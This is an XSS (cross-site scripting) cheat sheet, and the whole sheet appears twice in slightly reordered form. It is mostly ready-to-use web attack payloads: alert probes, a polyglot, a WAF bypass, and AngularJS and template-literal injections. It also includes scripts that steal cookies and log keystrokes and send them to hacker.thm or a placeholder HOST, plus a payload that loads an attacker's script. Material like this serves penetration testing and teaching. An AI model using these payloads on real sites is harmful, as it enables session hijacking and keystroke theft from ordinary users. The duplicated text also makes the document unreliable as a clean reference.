# XSS (Cross-Site Scripting) Cheat Sheet

## JavaScript Injections

This section covers payloads needed to prove XSS vulnerability. These payloads can be combined to create unique payloads according to language syntax. Most of the payloads shown here can also be used in HTML injection vectors.

### Shaking Visible Elements

Use this payload to shake all visible elements of the page as a visual indication of the vulnerability.

```javascript
setInterval(k => { 
  b = document.body.style; 
  b.marginTop = (b.marginTop == '4px') ? '-4px' : '4px'; 
}, 5);
```

### Alert Hidden Values

Use this payload to prove that all hidden HTML values like tokens and nonces in the target page can be stolen.

```javascript
f = document.forms;
for (i = 0; i < f.length; i++) {
  e = f[i].elements;
  for (n in e) {
    if (e[n].type == 'hidden') {
      alert(e[n].name + ': ' + e[n].value);
    }
  }
}
```

## Polygot Test XSS Payload

This test payload can execute in multiple contexts including HTML, script strings, JavaScript, and URLs.

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

[Source](https://brutelogic.com.br/blog/wp-content/uploads/2021/09/Brute-XSS-Cheat-Sheet-Sample.pdf)


## Identifying XSS Endpoints

Use the following payloads to identify XSS endpoints in a web application:

```html
<script>alert(document.domain);</script>
<script>alert("xss")</script>
<img src=1 onerror=alert(document.domain)>
<><img src=1 onerror=alert(document.domain)>
\"-alert(document.domain)}//
'-alert(document.domain)-'
”><svg onload=alert(document.domain)>
"><script>alert(document.domain)</script>
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
"onmouseover="alert(document.domain) <!-- for when angle brackets are HTML-encoded -->
```

## Loading Scripts from Attacker Machine

Use these payloads to load scripts from an attacker's machine:

```html
<script src=//HOST/SCRIPT></script>
<svg onload=fetch('//HOST/?cookie=' + document.cookie)>
```

## Embedding Images

Use this payload to embed an image:

```html
<img src="https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg">
```

*Note: Originally, the URL encoded HTML payload must be inserted into the database function, which in this case is looking up the name of a user.*

## AngularJS (ng-app)

Use this payload for AngularJS-based XSS:

```html
{{$on.constructor('alert(1)')()}}
```

[Source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

## Web Application Firewall (WAF) Bypass

When you need to throw a function to the global exception handler:

```html
onerror=alert;throw 1
```

## JavaScript Template Literals

Use this payload to exploit JavaScript template literals:

```javascript
${alert(document.domain)}
```

## Cookie Stealing

Base64 encode the cookie and send it to the attacker's server:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

## Key Logger

Use this payload to log keystrokes and send them to the attacker's server:

```html
<script>
document.onkeypress = function(e) { 
  fetch('https://hacker.thm/log?key=' + btoa(e.key)); 
}
</script>
```

## Sinks Leading to DOM-XSS Vulnerabilities

The following JavaScript functions can lead to DOM-based XSS vulnerabilities:

- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent`

## jQuery Functions Leading to DOM-XSS

The following jQuery functions can lead to DOM-based XSS vulnerabilities:

- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- `has()`
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`

## Additional Resources

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Filter Evasion Cheat Sheet](https://ocholuo.github.io/posts/XSS-Filter-Evasion-Cheat-Sheet/)# XSS (Cross-Site Scripting) Cheat Sheet

## Polygot Test XSS Payload

This test payload can execute in multiple contexts including HTML, script strings, JavaScript, and URLs.

```javascript
javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

[Source](https://brutelogic.com.br/blog/wp-content/uploads/2021/09/Brute-XSS-Cheat-Sheet-Sample.pdf)

## JavaScript Injections

This section covers payloads needed to prove XSS vulnerability. These payloads can be combined to create unique payloads according to language syntax. Most of the payloads shown here can also be used in HTML injection vectors.

### Shaking Visible Elements

Use this payload to shake all visible elements of the page as a visual indication of the vulnerability.

```javascript
setInterval(k => { 
  b = document.body.style; 
  b.marginTop = (b.marginTop == '4px') ? '-4px' : '4px'; 
}, 5);
```

### Alert Hidden Values

Use this payload to prove that all hidden HTML values like tokens and nonces in the target page can be stolen.

```javascript
f = document.forms;
for (i = 0; i < f.length; i++) {
  e = f[i].elements;
  for (n in e) {
    if (e[n].type == 'hidden') {
      alert(e[n].name + ': ' + e[n].value);
    }
  }
}
```

## Identifying XSS Endpoints

Use the following payloads to identify XSS endpoints in a web application:

```html
<script>alert(document.domain);</script>
<script>alert("xss")</script>
<img src=1 onerror=alert(document.domain)>
<><img src=1 onerror=alert(document.domain)>
\"-alert(document.domain)}//
'-alert(document.domain)-'
”><svg onload=alert(document.domain)>
"><script>alert(document.domain)</script>
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
"onmouseover="alert(document.domain) <!-- for when angle brackets are HTML-encoded -->
```

## Loading Scripts from Attacker Machine

Use these payloads to load scripts from an attacker's machine:

```html
<script src=//HOST/SCRIPT></script>
<svg onload=fetch('//HOST/?cookie=' + document.cookie)>
```

## Embedding Images

Use this payload to embed an image:

```html
<img src="https://www.bugcrowd.com/wp-content/uploads/2019/04/bugcrowd-logo.svg">
```

*Note: Originally, the URL encoded HTML payload must be inserted into the database function, which in this case is looking up the name of a user.*

## AngularJS (ng-app)

Use this payload for AngularJS-based XSS:

```html
{{$on.constructor('alert(1)')()}}
```

[Source](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression)

## Web Application Firewall (WAF) Bypass

When you need to throw a function to the global exception handler:

```html
onerror=alert;throw 1
```

## JavaScript Template Literals

Use this payload to exploit JavaScript template literals:

```javascript
${alert(document.domain)}
```

## Cookie Stealing

Base64 encode the cookie and send it to the attacker's server:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

## Key Logger

Use this payload to log keystrokes and send them to the attacker's server:

```html
<script>
document.onkeypress = function(e) { 
  fetch('https://hacker.thm/log?key=' + btoa(e.key)); 
}
</script>
```

## Sinks Leading to DOM-XSS Vulnerabilities

The following JavaScript functions can lead to DOM-based XSS vulnerabilities:

- `document.write()`
- `document.writeln()`
- `document.domain`
- `element.innerHTML`
- `element.outerHTML`
- `element.insertAdjacentHTML`
- `element.onevent`

## jQuery Functions Leading to DOM-XSS

The following jQuery functions can lead to DOM-based XSS vulnerabilities:

- `add()`
- `after()`
- `append()`
- `animate()`
- `insertAfter()`
- `insertBefore()`
- `before()`
- `html()`
- `prepend()`
- `replaceAll()`
- `replaceWith()`
- `wrap()`
- `wrapInner()`
- `wrapAll()`
- `has()`
- `constructor()`
- `init()`
- `index()`
- `jQuery.parseHTML()`
- `$.parseHTML()`

## Additional Resources

- [PayloadsAllTheThings - XSS Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [XSS Filter Evasion Cheat Sheet](https://ocholuo.github.io/posts/XSS-Filter-Evasion-Cheat-Sheet/)